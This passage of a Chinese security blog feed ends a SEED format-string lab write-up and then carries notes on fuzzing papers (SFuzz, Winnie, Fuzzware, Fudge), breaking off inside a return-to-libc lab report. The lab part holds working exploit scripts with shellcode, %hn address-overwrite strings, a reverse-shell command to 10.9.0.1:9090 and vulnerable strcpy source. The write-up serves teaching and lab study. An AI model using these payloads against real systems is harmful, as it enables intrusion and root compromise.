class="string">&quot;%.8x.&quot;</span>*<span class="number">62</span> + <span class="string">&quot;%.54170x&quot;</span>  + <span class="string">&quot;%hn&quot;</span> + <span class="string">&quot;%.10795x&quot;</span> + <span class="string">&quot;%hn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The line shows how to store the string s at offset 8</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[<span class="number">12</span>:<span class="number">12</span>+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Save the format string to file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>成功执行shellcode。</p>
<img src="/posts/5a0832a9/image-20231211170251532.png" class="" title="image-20231211170251532">

<h2 id="7-Task-5-Attacking-the-64-bit-Server-Program"><a href="#7-Task-5-Attacking-the-64-bit-Server-Program" class="headerlink" title="7 Task 5: Attacking the 64-bit Server Program"></a>7 Task 5: Attacking the 64-bit Server Program</h2><p>攻击64位机器，服务器选择10.9.0.6.首先发送hello消息</p>
<img src="/posts/5a0832a9/image-20231211170653364.png" class="" title="image-20231211170653364">

<p>问题：64位机器地址前两个字符为0x00，导致printf在解析地址时遇到<code>0x00</code>会停止解析（与overflow中strcpy不同，strcpy会直接截断，而此处的input仍然会传入，只是printf不会解析）</p>
<p>可以使用<code>$kth</code>表示第k个参数，同时将地址放在input末尾避免此问题。</p>
<p>构造payload如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 32-bit Generic Shellcode </span></span><br><span class="line">shellcode_32 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 64-bit Generic Shellcode </span></span><br><span class="line">shellcode_64 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span></span><br><span class="line">   <span class="string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAAAAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBBBBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCCCCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDDDDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Choose the shellcode version based on your target</span></span><br><span class="line">shellcode = shellcode_64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = N - <span class="built_in">len</span>(shellcode)               <span class="comment"># Change this number</span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#    Construct the format string here</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte integer at offset 0</span></span><br><span class="line">buf_addr = <span class="number">0x00007fffffffe5c0</span></span><br><span class="line">ret_addr = <span class="number">0x00007fffffffe500</span> + <span class="number">8</span></span><br><span class="line">shellcode_addr = buf_addr + start  <span class="comment"># 0x7fffffffeaf7</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(shellcode_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># target_addr for test</span></span><br><span class="line">target_addr = <span class="number">0x0000555555558010</span></span><br><span class="line">number  = ret_addr</span><br><span class="line">number1 = number + <span class="number">2</span></span><br><span class="line">number2 = number + <span class="number">4</span></span><br><span class="line">number3 = number + <span class="number">6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to construct a string s with</span></span><br><span class="line"><span class="comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;%46$.32767lx&quot;</span> + <span class="string">&quot;%46$hn&quot;</span> + <span class="string">&quot;%44$.27384lx&quot;</span> + <span class="string">&quot;%44$hn&quot;</span> + <span class="string">&quot;%45$.5384lx&quot;</span> + <span class="string">&quot;%45$hn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = &quot;%44$lx.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The line shows how to store the string s at offset 8</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">offset = <span class="number">80</span></span><br><span class="line">content[<span class="number">0</span>:<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line">content[offset:offset+<span class="number">8</span>] = (number).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">content[offset+<span class="number">8</span>:offset+<span class="number">16</span>] = (number1).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">content[offset+<span class="number">16</span>:offset+<span class="number">24</span>] = (number2).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="comment"># Save the format string to file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>其中需要注意高位地址恒为<code>0x0000</code>不需要修改，其他三个都需要进行修改。</p>
<img src="/posts/5a0832a9/image-20231211193743193.png" class="" title="image-20231211193743193">

<h3 id="8-Task-6-Fixing-the-Problem"><a href="#8-Task-6-Fixing-the-Problem" class="headerlink" title="8 Task 6: Fixing the Problem"></a>8 Task 6: Fixing the Problem</h3><p>修改如下。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// This line has a format-string vulnerability</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, msg);</span><br></pre></td></tr></table></figure>

<p>重新编译发现警告信息消失：</p>
<img src="/posts/5a0832a9/image-20231211194112960.png" class="" title="image-20231211194112960">

<p>重新进行攻击，尝试打印出前100个参数，失败：</p>
<img src="/posts/5a0832a9/image-20231211194819158.png" class="" title="image-20231211194819158">

<h3 id="9-Guidelines-on-Reverse-Shell"><a href="#9-Guidelines-on-Reverse-Shell" class="headerlink" title="9 Guidelines on Reverse Shell"></a>9 Guidelines on Reverse Shell</h3><p>只需修改shellcode内容即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 32-bit Generic Shellcode </span></span><br><span class="line">shellcode_32 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>成功获取root shell</p>
<img src="/posts/5a0832a9/image-20231211195911628.png" class="" title="image-20231211195911628">]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
        <tag>SEED</tag>
        <tag>Lab</tag>
        <tag>Format</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>SFuzz论文笔记</title>
    <url>/posts/69313c9b.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>RTOS系统当下并没有很好的分析方式，因此作者提出了sfuzz工具，利用RTOS每一项任务的控制流都是独立的特点，从RTOS系统中切出独立的代码块进行fuzzing。<br>项目地址：<a href="https://github.com/NSSL-SJTU/SFuzz">https://github.com/NSSL-SJTU/SFuzz</a></p>
<h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>解决了在当时RTOS领域模糊测试没有很好的分析方式的问题。</p>
<h2 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h2><ul>
<li>提出了RTOS系统的特点：每一项任务的控制流都是相互独立的，通过代码切片获取到独立的代码树，分别进行分析</li>
<li>使用了前向切片与后向切片，根据依赖和函数调用关系获取了代码片段以供fuzz</li>
<li>设计了SFuzz，对RTOS进行灰盒测试。</li>
</ul>
<h2 id="尚存不足"><a href="#尚存不足" class="headerlink" title="尚存不足"></a>尚存不足</h2><h2 id="具体内容"><a href="#具体内容" class="headerlink" title="具体内容"></a>具体内容</h2><p>sfuzzing一共分为四个模块，分别为Forward slicer，Control Flow Nodes Handler，Micro Fuzzing，Concolic Analyzer。</p>


<h3 id="Forward-Slicer"><a href="#Forward-Slicer" class="headerlink" title="Forward Slicer"></a>Forward Slicer</h3><p>由上图可知，forward slicer分为四个步骤，分别为恢复函数语义，根据函数语义构建相关函数调用图，修剪调用图，连接调用图。<br><strong>恢复函数语义</strong>：使用四种方法来恢复函数（1：接受用户输入的函数；2：sink函数；3：设置或接收全局变量的函数）。确定用户输入点，全局变量访问函数，sink函数。</p>
<ul>
<li>Symbol &amp; log Function：通过供应商给出的symbol，log function得出函数名的标签。</li>
<li>Virtual Execution：根据将函数接收参数数量和返回值与标准库函数比较，找出可能对应的库函数，然后进行内存分配，初始化寄存器和参数变量，最终模拟函数运行并根据运行结果和内存空间来识别标准库函数</li>
<li>Web Service Semantic：通过前后端文件来标记用户输入</li>
<li>Open Source firmware：一些供应商的产品是基于开源的RTOS系统改写而成，因此可以根据开源代码来匹配函数。</li>
</ul>
<p><strong>根据函数语义构建相关函数调用图</strong>：根据用户输入函数以及全局变量访问点，以这些函数的调用函数作为根节点，然后根据函数调用关系建立调用图</p>
<p><strong>函数调用图修剪</strong>：使用基于语义的污点分析，将相关的函数调用保留下来。</p>
<p><strong>调用图连接</strong>：由于某些全局输入的数据流可以被数据共享函数干扰，因此需要将这些有关的连接起来。</p>
<ul>
<li>对于存取常量的数据共享函数，根据常量值将相关节点连接起来，(&lt;nvram_set, nvram_get&gt;)</li>
<li>对于存取动态变量的函数，如下图<code>wan0_pppoe_username</code>，通过虚拟条件节点连接，在动态运行时根据实际变量值来确定是否跳转到输入点。</li>
</ul>
<h3 id="Control-Flow-Nodes-Handler"><a href="#Control-Flow-Nodes-Handler" class="headerlink" title="Control Flow Nodes Handler"></a>Control Flow Nodes Handler</h3><p>在通过前向切片获取到函数相关调用图以及基于此生成函数执行树后，control flow nodes handler需要在此基础上补全代码（补充上下文）以便进行后续的fuzzing测试。主要用于引导后续fuzzer fuzz的路径</p>
<blockquote>
<p>In other words, because of lacking full context and runtime state of the<br>RTOS, we need strategies to guide the fuzzer to determine how to handle the function call in the snippet and choose which branch of<br>the conditional statement to jump  </p>
</blockquote>
<ul>
<li>Call Instruction：如果函数的参数不受外界输入影响，那么将其加入<code>PatchedFunc</code>集合以便后续fuzzer识别，从而跳过此函数。</li>
<li>Conditional Branch：如果控制流存在条件分支，则根据条件与用户输入之间关系以及分支是否可以到达sink点来分情况讨论<ul>
<li>只有一个分支可以到达sink点，如果条件可以被输入影响，那么将无法到达sink的分支地址加入<code>PatchedJMP</code>集合，防止fuzzer探索该分支；否则，如果用户输入无法影响条件，则让将到达sink点分支地址添加到<code>PatchedJMP</code>集合，让fuzzer直接进入该分支。</li>
<li>两条分支都可以进入sink点，若条件可以被输入影响，那么不改变代码，让fuzzer随机生成输入来探索路径；否则将条件指令添加到<code>PatchedJMP</code>集合，让fuzzer将条件判断转换为随机的跳转地址</li>
<li>若没有分支可以到达sink点，那么将两个分支的地址加入<code>PatchedJMP</code>集合，让fuzzer当发现这些地址时退出path exploration</li>
</ul>
</li>
</ul>
<h3 id="Micro-Fuzzing"><a href="#Micro-Fuzzing" class="headerlink" title="Micro Fuzzing"></a>Micro Fuzzing</h3><p>一种slice_based fuzzing。将代码片段作为输入，探索执行树的执行路径。fuzzer会根据<code>PatchedFunc</code>集合与<code>PatchedJMP</code>集合指导下进行fuzzing。<br>其中，由于RTOS的缺乏对内存保护的机制，sfuzz提供了内存检查机制来检测是否存在栈溢出等漏洞。</p>
<h3 id="Concolic-Analyzer"><a href="#Concolic-Analyzer" class="headerlink" title="Concolic Analyzer"></a>Concolic Analyzer</h3><p>micro fuzzing提供fuzz成功的输入给concolic analyzer进行验证，concolic会恢复代码块的上下文进行验证crash input是否可以正确触发漏洞。</p>

<p>如上图代码示例，通过前向切片可以得出用户输入为line 8 <code>ledClsTime</code>，输出的sink点为line 17 <code>nvram_set</code>，通过前向切片有条件分支</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">11</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(ledCtlType , ledStatus))</span><br><span class="line"><span class="number">12</span> nvram_set(<span class="string">&quot;led_ctl_type&quot;</span>, ledStatus);</span><br><span class="line"><span class="number">13</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(<span class="string">&quot;2&quot;</span>, ledStatus) ) &#123;</span><br><span class="line"><span class="number">14</span> ledTime = nvram_get(<span class="string">&quot;led_time&quot;</span>); <span class="comment">// Other input #3</span></span><br><span class="line"><span class="number">15</span> sub_800D487C(a2, argbuf);</span><br><span class="line"><span class="number">16</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(ledTime , ledClsTime))</span><br><span class="line"><span class="number">17</span> nvram_set(<span class="string">&quot;led_time&quot;</span>, ledClsTime); <span class="comment">// Global data set</span></span><br><span class="line"><span class="number">18</span> &#125;</span><br></pre></td></tr></table></figure>

<p>条件分支涉及到了其他输入<code>ledCtlType</code>，<code>ledStatus</code>，<code>ledTime</code>，可以通过约束求解器来进行求解。<br>但是仅依靠前向切片的问题是无法确定其他输入是否真的可以影响sink条件分支。例如line11即无法改变sink点是否可达。因此需要通过后向切片查看是否会对结果产生影响，从而将line11删去。<br>同时，后向切片也会查看sink函数中被写入对象的大小，从而确定是否可以真的实现溢出。eg: <code>vulnGet</code></p>
<h2 id="知识点补充"><a href="#知识点补充" class="headerlink" title="知识点补充"></a>知识点补充</h2><p>前向切片与后向切片：<a href="https://blog.csdn.net/hmysn/article/details/124717162">https://blog.csdn.net/hmysn/article/details/124717162</a><br>FDT：<a href="https://blog.csdn.net/qq_44370676/article/details/120836743">https://blog.csdn.net/qq_44370676/article/details/120836743</a><br>AFL（基于coverage_guide的fuzzing工具）<a href="https://www.freebuf.com/articles/system/191543.html">https://www.freebuf.com/articles/system/191543.html</a></p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>Fuzz</tag>
        <tag>固件模拟</tag>
      </tags>
  </entry>
  <entry>
    <title>Winnie论文笔记</title>
    <url>/posts/ce05e772.html</url>
    <content><![CDATA[<h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>对当下Windows系统软件的fuzz没有合适的方法。提出了Winnie对Windows闭源软件进行fuzzing。</p>
<h2 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h2><ul>
<li>提出了Winnie，可以对Windows闭源软件进行模糊测试</li>
<li>实现了windows系统的fork方法，使得可以不用每次执行都得从头开始，提高了fuzzing效率，其中fork新进程的速度达到310次&#x2F;s显著高于windows自带CreateProcess91.9次&#x2F;s，与WSL的fork速度相近。</li>
</ul>
<h2 id="尚存不足"><a href="#尚存不足" class="headerlink" title="尚存不足"></a>尚存不足</h2><ul>
<li>由于闭源特性，无法全自动，需要人工参与fuzzer代码的生成</li>
</ul>
<h2 id="具体细节"><a href="#具体细节" class="headerlink" title="具体细节"></a>具体细节</h2><img src="/posts/ce05e772/image-20231220090115449.png" class="" title="image-20231220090115449">

<ul>
<li><p>生成fuzz代码</p>
<ul>
<li>Target Identification：确认二进制程序中可以用于fuzz的输入点（读取用户输入的api或函数）</li>
<li>Call-seq Recovery：恢复目标程序中函数体内对各个相关targetfunction调用的顺序（类似于fudge）</li>
<li>Argument Correction：恢复函数体的传入参数</li>
<li>Control-Data-flow：根据控制流和数据流依赖建立函数中各个api的关系。控制流依赖使用了静态分析，数据流依赖考虑了api的返回值与后面的api参数值的关系（直接用于下一个api参数，指针指向值作为下一个api参数）</li>
</ul>
</li>
<li><p>fork</p>
<ul>
<li>新建进程需要与CSRSS进程连接才能正常运行。</li>
<li>验证fork的子进程确实能够继承父进程变量值；fork实现是CoW（copy-on-write）</li>
<li>解决了多线程的问题。</li>
</ul>
</li>
<li><p>fuzzing</p>
<ul>
<li>使用了fullspeed fuzzing来收集代码覆盖率（根据遇到新的代码块来测算）</li>
<li><img src="/posts/ce05e772/image-20231220091346384.png" class="" title="image-20231220091346384"></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>论文复现</tag>
        <tag>DSE</tag>
      </tags>
  </entry>
  <entry>
    <title>Fuzzware复现</title>
    <url>/posts/6b4c8ab1.html</url>
    <content><![CDATA[<p>项目链接：<a href="https://github.com/fuzzware-fuzzer/fuzzware">https://github.com/fuzzware-fuzzer/fuzzware</a></p>
<h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1. 环境"></a>1. 环境</h2><p>Ubuntu22.04</p>
<p>docker</p>
<p>具体过程比较简单，可以直接看github readme</p>
<h2 id="2-复现"><a href="#2-复现" class="headerlink" title="2. 复现"></a>2. 复现</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./run_docker.sh examples fuzzware pipeline --skip-afl-cpufreq pw-recovery/ARCH_PRO</span><br></pre></td></tr></table></figure>

<p>由图可以看到刚开始运行时发现新的MMIO寄存器模型，由于MMIO Access Model中并不存在，因此会将其定义为新的模型，然后继续向下运行</p>
<img src="/posts/6b4c8ab1/image-20231220101350682.png" class="" title="image-20231220101350682">

<p>建模完毕后，开始进行正常的fuzzing阶段。</p>
<img src="/posts/6b4c8ab1/image-20231220101721217.png" class="" title="image-20231220101721217">

<p>一轮fuzzing结束后，根据反馈调整输入，开始下一阶段fuzzing。</p>
<img src="/posts/6b4c8ab1/image-20231220101952436.png" class="" title="image-20231220101952436">]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>IS</tag>
        <tag>IoT</tag>
        <tag>Fuzz</tag>
        <tag>固件模拟</tag>
        <tag>论文复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Fudge论文笔记</title>
    <url>/posts/edb8c304.html</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>google针对c与c++库提出了新的fuzz driver自动化生成方式。</p>
<h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>对C&#x2F;C++库代码片段的slice_based_fuzz。</p>
<h2 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h2><p>基于google海量代码库进行测试，完成了Fudge可以有效的处理海量的代码。发现其中的安全漏洞</p>
<h2 id="尚存不足"><a href="#尚存不足" class="headerlink" title="尚存不足"></a>尚存不足</h2><p>fuzz基于源代码，可以考虑在编译源代码为可执行文件后加入动态符号执行等技术。（也在其Future Work中体现（还提到了Machine Learning））</p>
<h2 id="Fudge具体过程"><a href="#Fudge具体过程" class="headerlink" title="Fudge具体过程"></a>Fudge具体过程</h2><h3 id="Slicing-Phrase"><a href="#Slicing-Phrase" class="headerlink" title="Slicing Phrase"></a>Slicing Phrase</h3><p>从google代码库中选出有关库函数的代码，以FreeImage库为例，slicer模块会扫描整个代码库，运行每一个源文件，假设slicer处理如下代码：</p>


<p>slicer会分析函数的抽象语法树(AST)，假如函数中存在对目标库函数（需要有解析api接口，即输入）的调用，slicer首先选择所有FreeImage调用语句，然后根据控制流和数据流依赖关系来扩充语句。当其中符号不是在函数内部定义或类型不是目标库函数定义时，不挑选该符号，置为UnknownX（如上图imgData-&gt;width非库函数定义类型，mImageType也非库函数内部定义类型）</p>
<p>控制流与数据流依赖关系参考：[<a href="https://blog.csdn.net/hmysn/article/details/124717162]">https://blog.csdn.net/hmysn/article/details/124717162]</a></p>
<p>提取出的代码如下，slicer会重新建立新的ast以供下一阶段使用：</p>


<h3 id="Synthesis-phase"><a href="#Synthesis-phase" class="headerlink" title="Synthesis phase"></a>Synthesis phase</h3><p>Synthesis模块接收提取的代码片段并填充其成为可供fuzzer fuzzing的函数。</p>
<p>对于一个UnknownX有多种重写方式，以上图中mImageType为例，既可以作为fuzzer的fuzzing对象，又可以直接设置为默认值0或1等常量。</p>


<p>重写UnknownX的算法如下，将slicer提取到的代码段的ast列表作为输入，pop列表中ast，对其做完整性检查，若不完整，则对其中UnknownX进行重写，并将重写后的ast重新加入incomplete_asts列表（需要保证重写后ast不重复，增加了seen_before的检验），若完整则将ast加入到complete_asts列表中，一直循环直到incomplete_asts列表变为空值。</p>


<h3 id="Evaluation-phrase"><a href="#Evaluation-phrase" class="headerlink" title="Evaluation phrase"></a>Evaluation phrase</h3><p>评估fuzz driver是否合适的两个标准 1）是否fuzz了正确的api（人工检验），2）api是否正确调用（自动检验，通过比较target的崩溃时间）</p>
<p>另外还有评价好坏的标准：</p>
<ol>
<li>The candidate should build successfully.</li>
<li>It should run successfully without generating a crashing<br>input for at least a few seconds.</li>
<li>The size of the minimized corpus of the target should be<br>larger than some lower threshold.</li>
<li>The larger the number of lines of the library covered, the<br>better. We measure both absolute coverage and increase in<br>coverage relative to the existing fuzz drivers for the library.</li>
</ol>
<h3 id="User-Interface"><a href="#User-Interface" class="headerlink" title="User Interface"></a>User Interface</h3><p>提供了用户界面的ui。</p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>Fuzz</tag>
        <tag>固件模拟</tag>
        <tag>论文复现</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络攻防大作业】Return_to_libc实验报告</title>
    <url>/posts/8a8d28bf.html</url>
    <content><![CDATA[<h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h3><ul>
<li><p>修改flag为学号</p>
</li>
<li><p>构建docker镜像（运行<code>sudo ./build.sh</code>，注意<code>chmod +x</code>修改权限），连接不稳定，可能需要多次尝试</p>
</li>
<li><p>开启docker，禁用ASLR。</p>
<img src="/posts/8a8d28bf/image-20231231144427491.png" class="" title="image-20231231144427491">
</li>
<li><p>使用<code>netstat -antp</code>查看ssh服务状态</p>
<img src="/posts/8a8d28bf/image-20231231144545863.png" class="" title="image-20231231144545863">
</li>
<li><p>登录容器<code>ssh 0.0.0.0 -p 49153 -l seed</code></p>
</li>
</ul>
<h3 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h3><p>运行镜像中vuln程序，vuln有setuid权限，因此可以尝试通过此来获取root shell。</p>
<img src="/posts/8a8d28bf/image-20231231145335514.png" class="" title="image-20231231145335514">

<p>查看vuln源代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BUF_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">bof</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buffer[BUF_SIZE];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> *framep;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy ebp into framep</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;movl %%ebp, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (framep));      </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* print out information for experiment purpose */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address of buffer[] inside bof():  0x%.8x\n&quot;</span>, (<span class="type">unsigned</span>)buffer);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Frame Pointer value inside bof():  0x%.8x\n&quot;</span>, (<span class="type">unsigned</span>)framep);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, str);   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> input[<span class="number">1000</span>];</span><br><span class="line">   FILE *badfile;</span><br><span class="line"></span><br><span class="line">   badfile = fopen(<span class="string">&quot;/home/seed/the_file&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="type">int</span> length = fread(input, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="number">1000</span>, badfile);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Address of input[] inside main():  0x%x\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>) input);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Input 